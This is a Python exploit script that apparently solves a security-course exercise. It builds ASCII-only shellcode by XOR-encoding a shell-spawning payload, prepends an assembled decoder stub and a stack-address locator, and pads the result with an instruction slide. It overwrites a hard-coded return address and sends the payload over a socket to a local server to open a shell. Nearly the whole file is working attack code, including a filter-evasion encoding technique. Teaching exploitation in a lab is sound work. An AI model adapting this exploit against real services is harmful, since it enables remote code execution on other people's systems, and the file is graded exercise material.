import functools
import os
import socket
import traceback
import q2

from infosec.utils import assemble, smoke
from typing import Tuple, Iterable
import struct

HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    encoded_data = bytearray(data)
    indices = []
    for idx in range(len(encoded_data)):
        if encoded_data[idx] > 0x7f:
            encoded_data[idx] ^= 0xff
            indices.append(idx)
    return bytes(encoded_data), indices


@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    decoder_inst = 'push 0; pop ebx; dec ebx; '  # set ebx = -1 (or in 2's complement 0xffffffff)
    curr_offset = 0
    for idx in indices:
        if (idx-curr_offset) > 0x7f:
            decoder_inst += ('push 0x7f; add eax, [esp]; pop ecx; ')     # update eax if the indices are bigger then 0x7f.
            curr_offset += 0x7f
        decoder_inst += ('xor byte ptr [eax + 0x%02x], bl; '%(idx-curr_offset))
    return assemble.assemble_data(decoder_inst)


@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    q2_shellcode                = get_raw_shellcode()
    encoded_shellcode, indices  = encode(q2_shellcode)
    decoder_code                = get_decoder_code(indices)
    offset_from_esp             = len(encoded_shellcode) + 4            # including: 4 bytes of return addr and 1 zero byte at the end
    # load shellcode addr to eax
    shellcode_addr_cmd = 'push esp; pop eax; push 0x7f; '
    while offset_from_esp > 0x7f:
        shellcode_addr_cmd += 'sub eax, [esp]; '
        offset_from_esp -= 0x7f

    shellcode_addr_cmd += 'pop ebx; '
    if offset_from_esp > 0:
        shellcode_addr_cmd += ('push 0x%02x; sub eax, [esp]; pop ebx; '%offset_from_esp)
    shellcode_addr_assembly          = assemble.assemble_data(shellcode_addr_cmd)
    return shellcode_addr_assembly + decoder_code + encoded_shellcode


@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    ascii_shellcode = get_ascii_shellcode()
    buff_start_addr   = 0xbfffdd4c
    ra_addr           = 0xbfffe15c
    message_size      = struct.pack('>L', ra_addr - buff_start_addr + 5)
    return message_size + ascii_shellcode.rjust(ra_addr - buff_start_addr, assemble.assemble_data('inc edx;')) + struct.pack('<I', buff_start_addr) + bytes([0])


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
